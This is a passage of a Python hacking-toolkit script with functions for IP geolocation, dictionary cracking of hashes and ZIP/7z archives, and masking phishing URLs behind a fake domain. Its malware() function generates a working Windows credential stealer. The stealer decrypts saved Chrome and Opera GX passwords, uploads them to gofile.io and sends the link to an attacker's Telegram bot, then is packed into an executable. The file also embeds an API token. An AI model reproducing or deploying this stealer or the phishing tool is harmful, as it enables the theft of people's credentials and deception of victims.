        print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
        
        print(f'{green}[+] Retrieving your public IP address...{rescolor}')
        
        # Get public IP using NetworkManager
        public_ip = network_manager.get_public_ip()
        
        if public_ip == "Unknown":
            print(f'{red}[-] Could not retrieve public IP address')
            return
        
        print(f'{green}[+] Your Public IP:{white} {public_ip}')
        
        # Get detailed IP information using ipinfo
        try:
            accessToken = config_manager.get('API_KEYS', 'ipinfo_key', fallback='58950d8a1c1383')
            handler = ipinfo.getHandler(accessToken)
            details = handler.getDetails(public_ip)
            
            print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
            print(f'{green}[+] IP Details:{rescolor}')
            
            for key, value in details.all.items():
                if key in ['city', 'region', 'country', 'loc', 'org', 'postal', 'timezone']:
                    print(f'{green}[+] {key.title()}:{white} {value}')
            
            # Extract coordinates for map
            if 'loc' in details.all:
                try:
                    lat, lng = details.all['loc'].split(',')
                    lat, lng = float(lat), float(lng)
                    
                    print(f'\n{green}[+] Coordinates:{white} {lat}, {lng}')
                    
                    # Create map
                    my_map = folium.Map(location=[lat, lng], zoom_start=10)
                    folium.Marker([lat, lng], popup=f'IP: {public_ip}').add_to(my_map)
                    
                    # Add circle for approximate location
                    folium.CircleMarker(
                        location=[lat, lng],
                        radius=1000,
                        popup=f'Approximate location of {public_ip}',
                        color='red',
                        fill=True
                    ).add_to(my_map)
                    
                    # Save map
                    map_filename = f'public_ip_{public_ip.replace(".", "_")}_location.html'
                    my_map.save(map_filename)
                    
                    print(f'{green}[+] Map saved as:{white} {map_filename}')
                    
                    # Open map in browser
                    try:
                        webbrowser.open(f'file://{os.path.abspath(map_filename)}')
                        print(f'{green}[+] Map opened in browser{rescolor}')
                    except:
                        print(f'{yellow}[!] Could not open map automatically{rescolor}')
                        
                except Exception as e:
                    logger.warning(f"Could not create map: {e}")
                    print(f'{yellow}[!] Could not create location map{rescolor}')
            
        except Exception as e:
            logger.warning(f"Could not get detailed IP info: {e}")
            print(f'{yellow}[!] Could not retrieve detailed IP information{rescolor}')
        
        print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        
    except Exception as e:
        logger.error(f"Public IP lookup error: {e}")
        print(f'{red}[-] Error during public IP lookup: {e}')

def enhanced_ip_lookup(ip):
    """Enhanced IP lookup with detailed information and map"""
    os.system('cls')
    
    try:
        print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
        print(f'{cyan}║                           ENHANCED IP LOOKUP                               ║')
        print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
        
        # Resolve IP if domain provided
        try:
            resolved_ip = socket.gethostbyname(ip)
            if resolved_ip != ip:
                print(f'{green}[+] Domain resolved to IP:{white} {resolved_ip}')
                ip = resolved_ip
        except:
            pass
        
        print(f'{green}[+] Looking up information for:{white} {ip}')
        
        latitudeandlatitude = []
        
        # Get detailed IP information
        try:
            accessToken = config_manager.get('API_KEYS', 'ipinfo_key', fallback='58950d8a1c1383')
            handler = ipinfo.getHandler(accessToken)
            details = handler.getDetails(ip)
            
            print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
            print(f'{green}[+] IP Details:{rescolor}')
            
            for key, value in details.all.items():
                print(f'{green}[+] {key.title()}:{white} {value}')
                if key == 'latitude' or key == 'longitude':
                    latitudeandlatitude.append(value)
            
            # DNS Record lookup
            try:
                hostname = socket.gethostbyaddr(ip)[0]
                print(f'{green}[+] DNS Record:{white} {hostname}')
            except Exception as error:
                print(f'{yellow}[!] DNS Record: Could not resolve{rescolor}')
            
            # Create map if coordinates available
            if len(latitudeandlatitude) >= 2:
                try:
                    latitude, longitude = float(latitudeandlatitude[0]), float(latitudeandlatitude[1])
                    
                    print(f'\n{green}[+] Coordinates:{white} {latitude}, {longitude}')
                    
                    # Create enhanced map
                    my_map = folium.Map(location=[latitude, longitude], zoom_start=10)
                    folium.Marker([latitude, longitude], popup=f'IP: {ip}').add_to(my_map)
                    
                    # Add circle for approximate location
                    folium.CircleMarker(
                        location=[latitude, longitude],
                        radius=1000,
                        popup=f'Approximate location of {ip}',
                        color='red',
                        fill=True
                    ).add_to(my_map)
                    
                    # Save map
                    safe_filename = re.sub(r'[<>:"/\\|?*]', '_', ip)
                    map_filename = f'ip_lookup_{safe_filename}_location.html'
                    my_map.save(map_filename)
                    
                    print(f'{green}[+] Map saved as:{white} {map_filename}')
                    
                    # Open map in browser
                    try:
                        webbrowser.open(f'file://{os.path.abspath(map_filename)}')
                        print(f'{green}[+] Map opened in browser{rescolor}')
                    except:
                        print(f'{yellow}[!] Could not open map automatically{rescolor}')
                        
                except Exception as e:
                    logger.warning(f"Could not create map: {e}")
                    print(f'{yellow}[!] Could not create location map{rescolor}')
            
        except Exception as e:
            logger.error(f"IP lookup error: {e}")
            print(f'{red}[-] Error retrieving IP information: {e}')
        
        print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
        
    except Exception as e:
        logger.error(f"IP lookup error: {e}")
        print(f'{red}[-] An unexpected error occurred: {e}')

def enhanced_hash_cracker(hashtocrack, pwds, hash_type):
    """Enhanced hash cracker with progress tracking and better error handling"""
    os.system('cls')
    
    supported_hashes = {
        1: hashlib.sha256,
        2: hashlib.sha1,
        3: hashlib.sha224,
        4: hashlib.sha384,
        5: hashlib.sha512,
        6: hashlib.md5
    }

    if hash_type not in supported_hashes:
        print(f'{red}[-] Hash type {hash_type} is not supported!')
        print(f'{yellow}[!] Supported types: 1=SHA256, 2=SHA1, 3=SHA224, 4=SHA384, 5=SHA512, 6=MD5')
        time.sleep(3)
        return

    hash_to_crack = hashtocrack
    hashtype = supported_hashes[hash_type]
    hashCaptured = False
    start_time = time.time()
    passwords_tested = 0
    
    try:
        # Count total passwords for progress tracking
        try:
            with open(pwds, 'r', encoding='utf-8', errors='ignore') as f:
                total_passwords = sum(1 for _ in f)
        except:
            total_passwords = 0
        
        print(f'{green}[+] Hash to crack:{white} {hash_to_crack}')
        print(f'{green}[+] Hash type:{white} {hashtype.__name__}')
        print(f'{green}[+] Password list:{white} {pwds}')
        if total_passwords > 0:
            print(f'{green}[+] Total passwords to test:{white} {total_passwords:,}')
        print(f'{green}[+] Starting crack process...{rescolor}\n')
        
        with open(pwds, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, passwd in enumerate(f, 1):
                passwd = passwd.strip()
                if not passwd:
                    continue
                
                try:
                    testing_hash = hashtype(passwd.encode()).hexdigest()
                    passwords_tested += 1
                    
                    if testing_hash == hash_to_crack:
                        elapsed = time.time() - start_time
                        print(f'\n{green}[+] HASH CRACKED SUCCESSFULLY!{rescolor}')
                        print(f'{green}[+] Password:{white} {passwd}')
                        print(f'{green}[+] Time taken:{white} {elapsed:.2f} seconds')
                        print(f'{green}[+] Passwords tested:{white} {passwords_tested:,}')
                        hashCaptured = True
                        break
                    else:
                        # Progress update every 1000 passwords
                        if passwords_tested % 1000 == 0:
                            elapsed = time.time() - start_time
                            rate = passwords_tested / elapsed if elapsed > 0 else 0
                            print(f'\r{cyan}[!] Testing password {passwords_tested:,}/{total_passwords:,} '
                                  f'({passwords_tested/total_passwords*100:.1f}%) - '
                                  f'Rate: {rate:.0f} pwd/s - Current: {passwd[:20]}...', end='')
                
                except Exception as e:
                    logger.warning(f"Error testing password '{passwd}': {e}")
                    continue
        
        if not hashCaptured:
            elapsed = time.time() - start_time
            print(f'\n{red}[-] Hash not found in password list{rescolor}')
            print(f'{yellow}[!] Total passwords tested: {passwords_tested:,}')
            print(f'{yellow}[!] Time elapsed: {elapsed:.2f} seconds')
        
        # Save results if hash was cracked
        if hashCaptured:
            try:
                os.chdir(tool_parent_dir)
                try:
                    os.makedirs('Hash_Cracker', exist_ok=True)
                except:
                    pass
                
                os.chdir('Hash_Cracker')
                
                with open('hash_cracker_results.txt', 'a', encoding='utf-8') as hashfile:
                    hashfile.write(f'Hash: {hash_to_crack}\n')
                    hashfile.write(f'Hash Type: {hashtype.__name__}\n')
                    hashfile.write(f'Cracked Password: {passwd}\n')
                    hashfile.write(f'Time Taken: {elapsed:.2f} seconds\n')
                    hashfile.write(f'Passwords Tested: {passwords_tested:,}\n')
                    hashfile.write('='*50 + '\n\n')
                
                print(f'\n{green}[+] Results saved to:{white} {os.path.abspath("hash_cracker_results.txt")}')
                
            except Exception as e:
                logger.error(f"Error saving results: {e}")
                print(f'{red}[-] Error saving results: {e}')
        
    except FileNotFoundError:
        print(f'{red}[-] Password list file not found: {pwds}')
    except Exception as e:
        logger.error(f"Hash cracker error: {e}")
        print(f'{red}[-] An unexpected error occurred: {e}')

def enhanced_zipfilecracker(zipf, passwordsList):
    """Enhanced ZIP file cracker with progress tracking, result management, and better error handling"""
    os.system('cls')
    
    # Create results directory
    results_dir = "ZIP_Cracker"
    if not os.path.exists(results_dir):
        os.makedirs(results_dir)
    
    # Banner
    print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
    print(f'{cyan}║                        ENHANCED ZIP FILE CRACKER                            ║')
    print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
    
    try:
        # Input validation
        if not zipf or not passwordsList:
            print(f'{red}[-] Error: Both ZIP file path and password list path are required{rescolor}')
            return None
        
        if not os.path.exists(zipf):
            print(f'{red}[-] ZIP file not found: {zipf}{rescolor}')
            return None
        
        if not os.path.exists(passwordsList):
            print(f'{red}[-] Password list not found: {passwordsList}{rescolor}')
            return None
        
        # Validate ZIP file extension
        if not zipf.lower().endswith('.zip'):
            print(f'{yellow}[!] Warning: File does not have .zip extension: {zipf}{rescolor}')
            user_input = input(f'{cyan}[?] Continue anyway? (y/N): {rescolor}').lower()
            if user_input != 'y':
                return None
        
        # Validate it's actually a ZIP file
        if not is_zipfile(zipf):
            print(f'{red}[-] File is not a valid ZIP archive: {zipf}{rescolor}')
            return None
        
        print(f'{green}[+] ZIP file:{white} {zipf}')
        print(f'{green}[+] Password list:{white} {passwordsList}')
        print(f'{green}[+] Starting crack process...{rescolor}\n')
        
        # Count total passwords for progress tracking
        try:
            with open(passwordsList, 'r', encoding='utf-8', errors='ignore') as f:
                total_passwords = sum(1 for _ in f)
            print(f'{cyan}[!] Total passwords to test: {total_passwords:,}{rescolor}\n')
        except Exception as e:
            logger.error(f"Error counting passwords: {e}")
            total_passwords = 0
            print(f'{yellow}[!] Could not count total passwords, progress tracking disabled{rescolor}\n')
        
        start_time = time.time()
        passwords_tested = 0
        current_password = ""
        
        # Try with standard zipfile first
        try:
            zf = ZipFile(zipf)
            print(f'{cyan}[!] Using standard ZIP decryption...{rescolor}')
            
            with open(passwordsList, 'r', encoding='utf-8', errors='ignore') as pwdf:
                for line_num, password in enumerate(pwdf, 1):
                    password = password.strip()
                    if not password:
                        continue
                    
                    current_password = password
                    passwords_tested += 1
                    
                    try:
                        zf.extractall(pwd=password.encode())
                        elapsed = time.time() - start_time
                        
                        # Success! Save results
                        success_msg = f"ZIP CRACKED SUCCESSFULLY!\nFile: {zipf}\nPassword: {password}\nTime taken: {elapsed:.2f} seconds\nPasswords tested: {passwords_tested:,}\nDate: {time.strftime('%Y-%m-%d %H:%M:%S')}"
                        
                        with open(os.path.join(results_dir, "zip_cracker_results.txt"), "w", encoding="utf-8") as f:
                            f.write(success_msg)
                        
                        print(f'\n{green}[+] PASSWORD FOUND!{rescolor}')
                        print(f'{green}[+] Password:{white} {password}')
                        print(f'{green}[+] Time taken:{white} {elapsed:.2f} seconds')
                        print(f'{green}[+] Passwords tested:{white} {passwords_tested:,}')
                        print(f'{green}[+] Results saved to:{white} {results_dir}/zip_cracker_results.txt{rescolor}')
                        
                        # Reset working directory
                        os.chdir(os.path.dirname(os.path.abspath(__file__)))
                        return password
                        
                    except Exception:
                        # Progress update every 100 passwords for better responsiveness
                        if passwords_tested % 100 == 0:
                            elapsed = time.time() - start_time
                            rate = passwords_tested / elapsed if elapsed > 0 else 0
                            percentage = (passwords_tested / total_passwords * 100) if total_passwords > 0 else 0
                            print(f'\r{cyan}[!] Testing password {passwords_tested:,}/{total_passwords:,} '
                                  f'({percentage:.1f}%) - '
                                  f'Rate: {rate:.0f} pwd/s - Current: {password[:30]}...', end='')
                        
        except NotImplementedError:
            # Try with pyzipper for AES encrypted files
            print(f'{yellow}[!] Standard ZIP decryption failed, trying AES decryption...{rescolor}')
            
            try:
                aesf = pyzipper.AESZipFile(zipf)
                print(f'{cyan}[!] Using AES ZIP decryption...{rescolor}')
                
                with open(passwordsList, 'r', encoding='utf-8', errors='ignore') as pwdf:
                    for line_num, password in enumerate(pwdf, 1):
                        password = password.strip()
                        if not password:
                            continue
                        
                        current_password = password
                        passwords_tested += 1
                        
                        try:
                            aesf.extractall(pwd=password.encode())
                            elapsed = time.time() - start_time
                            
                            # Success! Save results
                            success_msg = f"ZIP CRACKED SUCCESSFULLY! (AES)\nFile: {zipf}\nPassword: {password}\nTime taken: {elapsed:.2f} seconds\nPasswords tested: {passwords_tested:,}\nDate: {time.strftime('%Y-%m-%d %H:%M:%S')}"
                            
                            with open(os.path.join(results_dir, "zip_cracker_results.txt"), "w", encoding="utf-8") as f:
                                f.write(success_msg)
                            
                            print(f'\n{green}[+] PASSWORD FOUND!{rescolor}')
                            print(f'{green}[+] Password:{white} {password}')
                            print(f'{green}[+] Time taken:{white} {elapsed:.2f} seconds')
                            print(f'{green}[+] Passwords tested:{white} {passwords_tested:,}')
                            print(f'{green}[+] Results saved to:{white} {results_dir}/zip_cracker_results.txt{rescolor}')
                            
                            # Reset working directory
                            os.chdir(os.path.dirname(os.path.abspath(__file__)))
                            return password
                            
                        except Exception:
                            # Progress update every 100 passwords for better responsiveness
                            if passwords_tested % 100 == 0:
                                elapsed = time.time() - start_time
                                rate = passwords_tested / elapsed if elapsed > 0 else 0
                                percentage = (passwords_tested / total_passwords * 100) if total_passwords > 0 else 0
                                print(f'\r{cyan}[!] Testing password {passwords_tested:,}/{total_passwords:,} '
                                      f'({percentage:.1f}%) - '
                                      f'Rate: {rate:.0f} pwd/s - Current: {password[:30]}...', end='')
                            
            except Exception as e:
                logger.error(f"AES ZIP decryption error: {e}")
                print(f'{red}[-] AES decryption failed: {e}{rescolor}')
        
        # If we get here, password wasn't found
        elapsed = time.time() - start_time
        
        # Save failed attempt details
        failed_msg = f"ZIP CRACKING FAILED\nFile: {zipf}\nPassword list: {passwordsList}\nTotal passwords tested: {passwords_tested:,}\nTime elapsed: {elapsed:.2f} seconds\nLast password tested: {current_password}\nDate: {time.strftime('%Y-%m-%d %H:%M:%S')}"
        
        with open(os.path.join(results_dir, "zip_cracker_failed.txt"), "w", encoding="utf-8") as f:
            f.write(failed_msg)
        
        print(f'\n{red}[-] Password not found in the list{rescolor}')
        print(f'{yellow}[!] Total passwords tested: {passwords_tested:,}')
        print(f'{yellow}[!] Time elapsed: {elapsed:.2f} seconds')
        print(f'{yellow}[!] Failed attempt details saved to: {results_dir}/zip_cracker_failed.txt{rescolor}')
        
        # Reset working directory
        os.chdir(os.path.dirname(os.path.abspath(__file__)))
        return None
        
    except Exception as e:
        logger.error(f"ZIP cracker error: {e}")
        print(f'{red}[-] An unexpected error occurred: {e}{rescolor}')
        
        # Save error details
        try:
            error_msg = f"ZIP CRACKER ERROR\nFile: {zipf}\nPassword list: {passwordsList}\nError: {e}\nDate: {time.strftime('%Y-%m-%d %H:%M:%S')}"
            with open(os.path.join(results_dir, "zip_cracker_error.txt"), "w", encoding="utf-8") as f:
                f.write(error_msg)
            print(f'{yellow}[!] Error details saved to: {results_dir}/zip_cracker_error.txt{rescolor}')
        except:
            pass
        
        # Reset working directory
        os.chdir(os.path.dirname(os.path.abspath(__file__)))
        return None

def enhanced_url_masking():
    """Enhanced URL masking with better validation and error handling"""
    init(convert=True)
    
    try:
        print(f'{cyan}╔══════════════════════════════════════════════════════════════════════════════╗')
        print(f'{cyan}║                           URL MASKING                                        ║')
        print(f'{cyan}╚══════════════════════════════════════════════════════════════════════════════╝{rescolor}\n')
        
        def validate_url(url):
            url_format = re.compile(r'https?://(www.)?[a-zA-Z0-9-]+\.+[a-zA-Z0-9]+')
            if not re.match(url_format, url):
                raise ValueError('Invalid URL format. Please provide a valid web URL.')
            return True

        def validate_custom_domain(custom_domain):
            domain_format = re.compile(r'[a-zA-Z0-9-]+\.+[a-zA-Z0-9]+')
            if not re.match(domain_format, custom_domain):
                raise ValueError('Invalid custom domain. Please provide a valid domain name.')
            return True

        def validate_keyword(keyword):
            if not isinstance(keyword, str):
                raise TypeError('Input must be a string.')
            elif ' ' in keyword:
                raise TypeError('Keyword must not contain spaces. Replace spaces with "-".')
            elif len(keyword) > 30:
                raise ValueError('Input string exceeds the maximum allowed length (30 characters).')
            return True

        def extract_url(html_content: str):
            soup = BeautifulSoup(html_content, 'lxml')
            div = soup.find('div', attrs={'id': 'app'})
            return div.a.text if div and div.a else None

        def short_url(web_url):
            data = {
                'url': f'{web_url}',
                'shorturl': ''
            }
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
            }
            
            try:
                res = requests.post('https://da.gd/', data=data, headers=headers, timeout=10)
                res.raise_for_status()
                shorted_url = extract_url(res.text)
                return shorted_url if shorted_url else web_url
            except Exception as e:
                logger.warning(f"URL shortening failed: {e}")
                return web_url

        def mask_url(custom_domain, keyword, url):
            parsed_url = urlparse(short_url(url))
            masked_url = f'{parsed_url.scheme}://{custom_domain}-{keyword}@{parsed_url.netloc}{parsed_url.path}'
            return masked_url

        # Get URL type
        while True:
            try:
                print(f'{cyan}Select URL type:{rescolor}')
                print(f'{white}[1] Normal URL (ex: https://example.com/)')
                print(f'{white}[2] Host:Port URL (ex: https://example.com:8080)')
                
                url_type = int(input(f'{green}[+] Select option (1-2):{white} '))
                if url_type in [1, 2]:
                    break
                else:
                    print(f'{red}[-] Please select option 1 or 2{rescolor}')
            except ValueError:
                print(f'{red}[-] Please enter a valid number{rescolor}')
                continue

        # Get URL
        while True:
            try:
                url = input(f'{green}[+] URL to mask:{white} ')
                validate_url(url)
                break
            except ValueError as e:
                print(f'{red}[-] {e}{rescolor}')
                continue

        # Get custom domain
        while True:
            try:
                custom_domain = input(f'{green}[+] Custom domain (ex: google.com):{white} ')
                validate_custom_domain(custom_domain)
                break
            except ValueError as e:
                print(f'{red}[-] {e}{rescolor}')
                continue

        # Get keyword
        while True:
            try:
                keyword = input(f'{green}[+] Phish keyword (ex: login, free):{white} ')
                validate_keyword(keyword)
                break
            except ValueError as e:
                print(f'{red}[-] {e}{rescolor}')
                continue

        # Generate masked URL
        try:
            masked_url = mask_url(custom_domain, keyword, url)
            
            print(f'\n{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
            print(f'{green}[+] URL Masking Results:{rescolor}')
            print(f'{green}[+] Original URL:{white} {url}')
            print(f'{green}[+] Masked URL:{white} {masked_url}')
            
            # Save to file
            try:
                with open('masked_urls.txt', 'a', encoding='utf-8') as f:
                    f.write(f'Original: {url}\n')
                    f.write(f'Masked: {masked_url}\n')
                    f.write(f'Domain: {custom_domain}\n')
                    f.write(f'Keyword: {keyword}\n')
                    f.write('='*50 + '\n\n')
                
                print(f'{green}[+] Results saved to:{white} masked_urls.txt')
                
            except Exception as e:
                logger.warning(f"Could not save results: {e}")
                print(f'{yellow}[!] Could not save results to file{rescolor}')
            
            print(f'{green}══════════════════════════════════════════════════════════════════════════════{rescolor}')
            
        except Exception as e:
            logger.error(f"URL masking error: {e}")
            print(f'{red}[-] Error generating masked URL: {e}')
        
    except Exception as e:
        logger.error(f"URL masking error: {e}")
        print(f'{red}[-] An unexpected error occurred: {e}')


def malware(botToken, cid, malname, malico):
    os.system('cls')
    os.chdir(tool_parent_dir)
    code = r"""
import shutil
import os
import json
import base64
import time
from telebot import TeleBot
import win32crypt
import sqlite3
from Crypto.Cipher import AES
import colorama
import requests
import subprocess

def get_pc_name_and_public_ip():

        pc_name = os.getlogin()

        ip = subprocess.check_output('curl -s ifconfig.me/ip', shell=True).decode()

        with open('passwords_google_database.txt', 'a') as f:

            f.writelines(['*'*50, '\n', f'PC Name: {pc_name}', '\n', f'Public IP: {ip}', '\n' , '*'*50, '\n\n'])

            f.close() 

def send_email(download_link):

    token = '%s'

    chat_id = %s

    url = f'https://api.telegram.org/bot{token}/SendMessage?chat_id={chat_id}&text={download_link}'

    requests.get(url)

def upload_file(file):

    res = subprocess.check_output('curl -s https://api.gofile.io/servers', shell=True).decode()

    jsdata = json.loads(res)

    server = jsdata['data']

    server = server['servers'][0]['name']

    res = subprocess.check_output(f'curl -s -F file=@{file} https://{server}.gofile.io/contents/uploadfile', shell=True).decode()

    jsdata = json.loads(res)

    download_link = jsdata['data']['downloadPage']

    send_email(download_link)

class Chrome:

    def __init__(self) -> None:
        pass

    def get_encrypt_key(self):

        local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'))


        with open(local, 'r') as f:

            jsdata = json.loads(f.read())


        return jsdata['os_crypt']['encrypted_key']


    def decode_encrypted_key(self, encrypted_key):

        return base64.b64decode(encrypted_key)


    def decrypt_decoded_key(self, decoded_key):

        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]

    def decrypt_saved_password(self, password, key):

        try:

            iv = password[3:15]

            password = password[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()

        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return


class Opera:

    def __init__(self) -> None:
        pass

    def get_encrypt_key(self):

        local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Local State'))


        with open(local, 'r') as f:

            jsdata = json.loads(f.read())


        return jsdata['os_crypt']['encrypted_key']


    def decode_encrypted_key(self, encrypted_key):

        return base64.b64decode(encrypted_key)


    def decrypt_decoded_key(self, decoded_key):

        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]

    def decrypt_saved_password(self, password, key):

        try:

            iv = password[3:15]

            password = password[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()

        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return

def chrome():

    try:

        chrome = Chrome()

        encrypted_key = chrome.get_encrypt_key()

        decoded_key = chrome.decode_encrypted_key(encrypted_key)[5:]

        decrypted_key = chrome.decrypt_decoded_key(decoded_key)

        db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'))

        filename = 'ChromeData.db'

        shutil.copyfile(db, filename)

        database = sqlite3.connect(filename)

        if database:


            cursor = database.cursor()

            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

            for row in cursor.fetchall():
                print('='*40)

                origin_url = row[0]
                action_url = row[1]
                user_or_email = row[2]
                password = row[3]
                password = chrome.decrypt_saved_password(password, decrypted_key)

                print('*'*50)

                result =f'''
    {colorama.Fore.GREEN}[!] Browser: {colorama.Fore.RESET}Google Chrome
    {colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
    {colorama.Fore.GREEN}[+] Action Url: {colorama.Fore.RESET}{action_url}
    {colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
    {colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
                        '''

                print(result)
                print('*'*50)

                with open('passwords_google_database.txt', 'a') as f:
                    f.writelines([f'[+] Browser: Google Chrome\n[+] Origin Url: {origin_url}', '\n', f'[+] Action Url: {action_url}', '\n', f'[+] Username: {user_or_email}', '\n', f'[+] Password: {password}', '\n','='*40, '\n\n'])

        database.close()           
        os.remove('ChromeData.db')

    except:
        pass

def opera():

    try:

        opera = Opera()

        encrypted_key = opera.get_encrypt_key()

        decoded_key = opera.decode_encrypted_key(encrypted_key)[5:]

        decrypted_key = opera.decrypt_decoded_key(decoded_key)

        db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Login Data'))

        filename = 'OperaData.db'

        shutil.copyfile(db, filename)

        database = sqlite3.connect(filename)

        if database:


            cursor = database.cursor()

            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

            for row in cursor.fetchall():
                print('='*40)

                origin_url = row[0]
                action_url = row[1]
                user_or_email = row[2]
                password = row[3]
                password = opera.decrypt_saved_password(password, decrypted_key)

                print('*'*50)

                result =f'''
    {colorama.Fore.GREEN}[!] Browser: {colorama.Fore.RESET}Opera GX
    {colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
    {colorama.Fore.GREEN}[+] Action Url: {colorama.Fore.RESET}{action_url}
    {colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
    {colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
                        '''

                print(result)
                print('*'*50)

                with open('passwords_google_database.txt', 'a') as f:
                    f.writelines([f'[+] Browser: Opera GX\n[+] Origin Url: {origin_url}', '\n', f'[+] Action Url: {action_url}', '\n', f'[+] Username: {user_or_email}', '\n', f'[+] Password: {password}', '\n','='*40, '\n\n'])

        database.close()           
        os.remove('OperaData.db')
    except:
        pass

def main():

    print('\n================= Chrome =================\n\n')

    chrome()

    print('\n================= Opera =================\n\n')
    opera()

if __name__ == '__main__':

    userprofile = os.path.join(os.environ['USERPROFILE'])
    os.chdir(userprofile)
    colorama.init(convert=True)
    get_pc_name_and_public_ip()
    main()
    upload_file('passwords_google_database.txt')
    os.remove('passwords_google_database.txt')

""" % (str(botToken), cid)

    with open(malname + '.py', 'w') as f:
        f.writelines([code])
        f.close()

    # Use enhanced py2exe function for better functionality
    enhanced_py2exe(malname + '.py', malico)


def public_ip():
    os.system('cls')
    ip = subprocess.check_output('curl -s ifconfig.me/ip', shell=True).decode().strip()
    return ip



def zipfilecracker(zipf, passwordsList):
    os.system('cls')
    # init zipfile object
    os.chdir(tool_parent_dir)
    if is_zipfile(zipf):
        zf = ZipFile(zipf)
        with open(passwordsList, 'rb') as pwdf:  # open file cotains passwords
            pwdsList = pwdf.readlines()  # read all file lines and store them into list
            for pwd in pwdsList:  # iterate through list
                password = pwd.strip()
                try:
                    zf.extractall(pwd=password)  # try to extract the zipped file with the given password
                except NotImplementedError:  # is the zipped file was encrypted by zipcrypto instead of AES256
                    try:
                        aesf = pyzipper.AESZipFile(zipf)
                        aesf.extractall(pwd=password)
                    except:
                        print(f'\n{red}[-] Password Error:{white} {password.decode()}')
                    else:
                        print(f'\n{green}[+] Password Found:{white} {password.decode()}')
                        break


def ip_lookup(ip):
    os.system('cls')
    latitudeandlatitude = []
    resolve_ip = socket.gethostbyname(ip)
    try:
        accessToken = '58950d8a1c1383'
        handler = ipinfo.getHandler(accessToken)
        details = handler.getDetails(resolve_ip)
        for key, value in details.all.items():
            print(f'{green}[+] {key}:{white} {value}')
            if key == 'latitude' or key == 'longitude':
                latitudeandlatitude.append(value)
    except:
        print(f'\n{red}[-] Invalid IP Address:{white} {resolve_ip}')
    else:
        try:
            print(f'{green}[+] DNS Record: {white}{socket.gethostbyaddr(resolve_ip)[0]}')
        except Exception as error:
            print(str(error))
            pass
        try:
            latitude, longitude = tuple(latitudeandlatitude)
            ip_geolocation = f'https://www.google.com/maps/search/?api=1&query={latitude},{longitude}'
            webbrowser.open(ip_geolocation)
        except Exception as err:
            print(str(err))
            pass


def hash_cracker(hashtocrack, pwds, hash_type):
    os.system('cls')
    supported_hashes = {

        1: hashlib.sha256,
        2: hashlib.sha1,
        3: hashlib.sha224,
        4: hashlib.sha384,
        5: hashlib.sha512,
        6: hashlib.md5
    }

    if hash_type in supported_hashes:
        hash_to_crack = hashtocrack
        hashtype = supported_hashes[hash_type]
        hashCaptured = False
        try:
            with open(pwds, 'r') as f:
                pwd = f.read().split('\n')
                for passwd in pwd:
                    testing_hash = hashtype(passwd.strip().encode()).hexdigest()
                    if testing_hash == hash_to_crack:
                        print(f'{green}[+] Hash Has Been Cracked:{white} {passwd}')
                        hashCaptured = True
                        break
                    else:
                        print(f'{yellow}[!] Trying With:{white} {passwd}')
                else:
                    print(f'\n{green}[+] {white}Process Has Been Finished')
        except OSError:
            os.system('cls')
            print(f'\n{red}[-] The Passwords List Not Found, Please Make Sure You Have The Correct Path.')
        finally:
            if hashCaptured:
                try:
                    os.chdir(tool_parent_dir)
                    try:
                        os.mkdir('Hash_Cracker')
                    except FileExistsError:
                        os.chdir('Hash_Cracker')
                    else:
                        os.chdir('Hash_Cracker')
                    with open('hash_cracker.txt', 'a') as hashfile:
                        hashfile.writelines([f'Hash: {hash_to_crack}\nCracked Hash: {passwd}', '\n\n'])
                        hashfile.close()
                except Exception as e:
                    print(f'{red}[-] Error Details: {white}{e}')
                else:
                    print(f'\n{green}[+] Hash Saved Into: {white}{os.path.abspath('hash_cracker.txt')}')
            else:
                return False
    else:
        print(f'\n{red}[-] {white}Hash Type Isn\'t Supported !')
        time.sleep(3)


def enhanced_sevenz_cracker(sevenzfile, passlist):
    """Enhanced 7z file cracker with progress tracking and better error handling"""
    os.system('cls')
    
    try:
        # Validate input files
        if not os.path.exists(sevenzfile):
